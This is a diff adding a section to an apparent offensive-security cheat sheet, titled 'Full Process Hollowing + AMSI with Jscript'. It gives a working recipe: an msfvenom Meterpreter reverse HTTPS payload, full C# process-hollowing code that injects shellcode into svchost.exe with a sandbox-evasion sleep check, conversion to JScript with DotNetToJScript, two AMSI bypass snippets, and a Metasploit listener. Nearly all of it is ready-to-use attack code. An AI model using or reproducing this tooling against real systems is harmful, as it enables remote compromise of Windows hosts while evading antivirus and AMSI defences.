@@ -322,6 +322,240 @@ set lport PORT
 exploit
 ```
 
+## Full Process Hollowing + AMSI with Jscript
+
+1. Use 64 bit generate shellcode:\
+`msfvenom -p windows/x64/meterpreter/reverse_https LHOST=IP LPORT=PORT EXITFUNC=thread -f csharp`
+
+2. Use HelperProgram to obfuscate the code. Under DotNetToJScript, ExampleAssembly put this and replace shellcode:
+
+```
+//    This file is part of DotNetToJScript.
+//    Copyright (C) James Forshaw 2017
+//
+//    DotNetToJScript is free software: you can redistribute it and/or modify
+//    it under the terms of the GNU General Public License as published by
+//    the Free Software Foundation, either version 3 of the License, or
+//    (at your option) any later version.
+//
+//    DotNetToJScript is distributed in the hope that it will be useful,
+//    but WITHOUT ANY WARRANTY; without even the implied warranty of
+//    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+//    GNU General Public License for more details.
+//
+//    You should have received a copy of the GNU General Public License
+//    along with DotNetToJScript.  If not, see <http://www.gnu.org/licenses/>.
+
+using System.Diagnostics;
+using System.Runtime.InteropServices;
+using System.Windows.Forms;
+using System;
+using System.Collections.Generic;
+using System.Linq;
+using System.Text;
+using System.Threading;
+
+[ComVisible(true)]
+public class TestClass
+{
+    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Ansi)]
+    struct STARTUPINFO
+    {
+        public Int32 cb;
+        public IntPtr lpReserved;
+        public IntPtr lpDesktop;
+        public IntPtr lpTitle;
+        public Int32 dwX;
+        public Int32 dwY;
+        public Int32 dwXSize;
+        public Int32 dwYSize;
+        public Int32 dwXCountChars;
+        public Int32 dwYCountChars;
+        public Int32 dwFillAttribute;
+        public Int32 dwFlags;
+        public Int16 wShowWindow;
+        public Int16 cbReserved2;
+        public IntPtr lpReserved2;
+        public IntPtr hStdInput;
+        public IntPtr hStdOutput;
+        public IntPtr hStdError;
+    }
+
+    [StructLayout(LayoutKind.Sequential)]
+    internal struct PROCESS_INFORMATION
+    {
+        public IntPtr hProcess;
+        public IntPtr hThread;
+        public int dwProcessId;
+        public int dwThreadId;
+    }
+
+    [StructLayout(LayoutKind.Sequential)]
+    internal struct PROCESS_BASIC_INFORMATION
+    {
+        public IntPtr Reserved1;
+        public IntPtr PebAddress;
+        public IntPtr Reserved2;
+        public IntPtr Reserved3;
+        public IntPtr UniquePid;
+        public IntPtr MoreReserved;
+    }
+
+    [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
+    static extern bool CreateProcess(string lpApplicationName, string lpCommandLine,
+IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles,
+    uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory,
+        [In] ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);
+
+    [DllImport("ntdll.dll", CallingConvention = CallingConvention.StdCall)]
+    private static extern int ZwQueryInformationProcess(IntPtr hProcess,
+int procInformationClass, ref PROCESS_BASIC_INFORMATION procInformation,
+    uint ProcInfoLen, ref uint retlen);
+
+    [DllImport("kernel32.dll", SetLastError = true)]
+    static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress,
+[Out] byte[] lpBuffer, int dwSize, out IntPtr lpNumberOfBytesRead);
+
+    [DllImport("kernel32.dll")]
+    static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);
+
+    [DllImport("kernel32.dll", SetLastError = true)]
+    private static extern uint ResumeThread(IntPtr hThread);
+
+    [DllImport("kernel32.dll")]
+    static extern void Sleep(uint dwMilliseconds);
+
+    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
+    static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress,
+uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);
+
+    [DllImport("kernel32.dll")]
+    static extern IntPtr GetCurrentProcess();
+    public TestClass()
+    {
+        DateTime t1 = DateTime.Now;
+        Sleep(2000);
+        double t2 = DateTime.Now.Subtract(t1).TotalSeconds;
+        if (t2 < 1.5)
+        {
+            return;
+        }
+
+        IntPtr mem = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0);
+        if (mem == null)
+        {
+            return;
+        }
+
+        STARTUPINFO si = new STARTUPINFO();
+        PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
+
+        bool res = CreateProcess(null, "C:\\Windows\\System32\\svchost.exe", IntPtr.Zero,
+            IntPtr.Zero, false, 0x4, IntPtr.Zero, null, ref si, out pi);
+
+        PROCESS_BASIC_INFORMATION bi = new PROCESS_BASIC_INFORMATION();
+        uint tmp = 0;
+        IntPtr hProcess = pi.hProcess;
+        ZwQueryInformationProcess(hProcess, 0, ref bi, (uint)(IntPtr.Size * 6), ref tmp);
+
+        IntPtr ptrToImageBase = (IntPtr)((Int64)bi.PebAddress + 0x10);
+
+        byte[] addrBuf = new byte[IntPtr.Size];
+        IntPtr nRead = IntPtr.Zero;
+        ReadProcessMemory(hProcess, ptrToImageBase, addrBuf, addrBuf.Length, out nRead);
+
+        IntPtr svchostBase = (IntPtr)(BitConverter.ToInt64(addrBuf, 0));
+        byte[] data = new byte[0x200];
+        ReadProcessMemory(hProcess, svchostBase, data, data.Length, out nRead);
+
+        uint e_lfanew_offset = BitConverter.ToUInt32(data, 0x3C);
+
+        uint opthdr = e_lfanew_offset + 0x28;
+
+        uint entrypoint_rva = BitConverter.ToUInt32(data, (int)opthdr);
+
+        IntPtr addressOfEntryPoint = (IntPtr)(entrypoint_rva + (UInt64)svchostBase);
+
+        byte[] buf = new byte[657] {  };
+
+        for (int i = 0; i < buf.Length; i++)
+        {
+            buf[i] = (byte)(((uint)buf[i] - 2) & 0xFF);
+        }
+
+        WriteProcessMemory(hProcess, addressOfEntryPoint, buf, buf.Length, out nRead);
+
+        ResumeThread(pi.hThread);
+    }
+
+    public void RunProcess(string path)
+    {
+        Process.Start(path);
+    }
+}
+```
+
+3\. Set to x64 and build (for 64 bit just the ExampleAssembly will do).
+
+4\. Copy the following files to a same folder (remember look at x64 for ExampleAssembly):\
+`DotNetToJScript-master\DotNetToJScript\bin\Release\DotNetToJscript.exe`\
+`DotNetToJScript-master\DotNetToJScript\bin\Release\NDesk.Options.dll`\
+`DotNetToJScript-master\ExampleAssembly\bin\x64\Release\ExampleAssembly.dll`
+
+5\. Run the following in that folder:\
+`DotNetToJScript.exe ExampleAssembly.dll --lang=Jscript --ver=v4 -o runner.js`
+
+6a\. The runner.js is the actual file containing the payload. Open it up and add the following lines at the beginning:
+
+```
+var sh = new ActiveXObject('WScript.Shell');
+var key = "HKCU\\Software\\Microsoft\\Windows Script\\Settings\\AmsiEnable";
+try{
+	var AmsiEnable = sh.RegRead(key);
+	if(AmsiEnable!=0){
+	throw new Error(1, '');
+	}
+}catch(e){
+	sh.RegWrite(key, 0, "REG_DWORD");
+	sh.Run("cscript -e:{F414C262-6AC0-11CF-B6D1-00AA00BBBB58} "+WScript.ScriptFullName,0,1);
+	sh.RegWrite(key, 1, "REG_DWORD");
+	WScript.Quit(1);
+}
+```
+
+6b\. Alternatively can add this instead:
+
+```
+var filesys= new ActiveXObject("Scripting.FileSystemObject");
+var sh = new ActiveXObject('WScript.Shell');
+try
+{
+	if(filesys.FileExists("C:\\Windows\\Tasks\\AMSI.dll")==0)
+	{
+		throw new Error(1, '');
+	}
+}
+catch(e)
+{
+	filesys.CopyFile("C:\\Windows\\System32\\wscript.exe", "C:\\Windows\\Tasks\\AMSI.dll");
+	sh.Exec("C:\\Windows\\Tasks\\AMSI.dll -e:{F414C262-6AC0-11CF-B6D1-00AA00BBBB58} "+WScript.ScriptFullName);
+	WScript.Quit(1);
+}
+```
+
+7\. Wait for incoming connection.
+
+```
+msfconsole -q
+use multi/handler
+set payload windows/x64/meterpreter/reverse_https
+set lhost IP
+set lport PORT
+set EnableStageEncoding true
+set StageEncoder x64/xor_dynamic
+exploit
+```
+
 ## Powershell Inside VBA ##
 
 1. Must use 64 bit for the Powershell shellcode runner for this:\
